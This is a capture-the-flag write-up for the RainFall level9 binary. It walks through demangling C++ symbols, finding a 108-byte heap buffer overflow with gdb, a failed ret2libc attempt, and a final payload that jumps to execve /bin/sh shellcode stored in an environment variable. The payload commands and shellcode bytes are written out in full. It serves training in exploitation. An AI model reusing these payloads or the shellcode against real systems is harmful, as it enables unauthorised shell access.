# Write up

First of all, we have lots of strange functions which we assume be C++ after some research, this concerns some of those calls (GOT) :
```
08049b80 R_386_COPY        _ZTVN10__cxxabiv117__class_type_infoE
08049b58 R_386_JUMP_SLOT   _ZNSt8ios_base4InitC1Ev
08049b64 R_386_JUMP_SLOT   _ZNSt8ios_base4InitD1Ev
08049b70 R_386_JUMP_SLOT   _Znwj
```
We have first to understand what those functions do.
We can demangle it using the objdump `-C` flag.
```
objdump -M intel -d bin9 -C > asm9_intel_unm.txt
```
Which give us a dissassembled file with clear C++ symbols names.

While reverse enginering the program we tried to check the exit codes :
```
level9@RainFall:~$ ./level9 e e
level9@RainFall:~$ echo $?
11
level9@RainFall:~$ ./level9
level9@RainFall:~$ echo $?
1
```
The program exits with the code 1 with no arguments, as expected.
But with argument it exits with the exit code 11, which help us to understand the code better.
After translation, we get an unprotected buffer with a size of 108, we try with a dummy payload :
```
level9@RainFall:~$ ./level9 $(python -c "print 'A' * 108")
level9@RainFall:~$ ./level9 $(python -c "print 'A' * 109")
Segmentation fault (core dumped)
```
Great, we can try, like the level2 exercice to execute the ret2libc exploit, however we have only a 4 byte range to exploit the overflow here.
So our payload will have to be inside the buffer, which as saved EIP an in-buffer address.
We get it using gdb :
```
level9@RainFall:~$ gdb level9
(gdb) break* 0x8048738
(gdb) run $(python -c "print 'A' * 108")
(gdb) x/40xw $eax
0x804a00c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a01c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a02c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a03c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a04c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a05c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a06c:      0x41414141      0x41414141      0x41414141      0x08048848
0x804a07c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a08c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a09c:      0x00000000      0x00000000      0x00000000      0x00000000
```
By checking the memcpy result in the eax register, we can notice our A padding, and the `0x08048848` address which was set at the saved EIP we found in the source code.
The base address is `0x804a00c`.
We build then a new payload :
```
# eax memory segment here
0x804a00c:      0xb7d86060      0x4c44494c      0xb7ea7c58      0x41414141
0x804a01c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a02c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a03c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a04c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a05c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a06c:      0x41414141      0x41414141      0x41414141      0x0804a00c
0x804a07c:      0x00000000      0x00000000      0x00000000      0x00000000
# Payload
./level9 $(python -c "print '\x60\x60\xd8\xb7' + 'LIDL' + '\x58\x7c\xea\xb7' + 'A' * 96 + '\x0c\xa0\x04\x08'")
sh: 1:
       �: not found
```
Which seems to execute the `/bin/sh` command, however, even with piping from cat -, it seems that we can't keep our shell.
To avoid this issue, we will need a `/bin/sh\0` string :
```
export LIDL="/bin/sh\0"
echo 'void main(){printf("%p\n", getenv("LIDL"));}' > /tmp/lidl9.c; gcc /tmp/lidl9.c -o /tmp/lidl9; chmod 777 /tmp/lidl9; /tmp/lidl9 # 0xbfffff35 here
# New payload
./level9 $(python -c "print '\x60\x60\xd8\xb7' + 'LIDL' + '\x35\xff\xff\xbf' + 'A' * 96 + '\x0c\xa0\x04\x08'")
```
However, still our `not found` error, which exposed a mistake of mine :
```
level9@RainFall:~$ ./level9 $(python -c "print '\x60\x60\xd8\xb7' + 'LIDL' + '\x36\xff\xff\xaf' + 'A' * 96 + '\x0c\xa0\x04\x08'") 2>&1 | hd
00000000  73 68 3a 20 31 3a 20 [0c  a0 04 08] 3a 20 6e 6f 74  |sh: 1: ....: not|
00000010  20 66 6f 75 6e 64 0a                              | found.|
00000017
```
The 4 chars highlighted here are our (overwriten) saved EIP address, which is totaly normal since that even if we execute a system function, we're still in the setAnnotation stack frame.
 
We saw before that we can get the address of an environnement variable, so we will store in the environnement a generic shell code which opens a shell and get its address :
```
export LIDLCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
echo 'void main(){printf("%p\n", getenv("LIDLCODE"));}' > /tmp/lidl9.c; gcc /tmp/lidl9.c -o /tmp/lidl9; chmod 777 /tmp/lidl9; /tmp/lidl9 # 0xbfffff94 here
# Final payload
./level9 $(python -c "print '\x98\xff\xff\xbf' +  'A' * 104 + '\x0c\xa0\x04\x08'") # 4 bytes farther
```
Which gives us our flag, Hooray !
Bonus starts at the next episode.

## Sources

https://beta.hackndo.com/buffer-overflow/ (Generic shellcode found here)
https://stackoverflow.com/questions/47890484/undefined-symbol-during-dlopen
http://repository.root-me.org/Reverse%20Engineering/EN%20-%20Reversing%20C++%20-%20Blackhat%20-%20Yason%20Sabanal%20-%20paper.pdf
https://reverseengineering.stackexchange.com/questions/4402/what-is-operator-newunsigned-int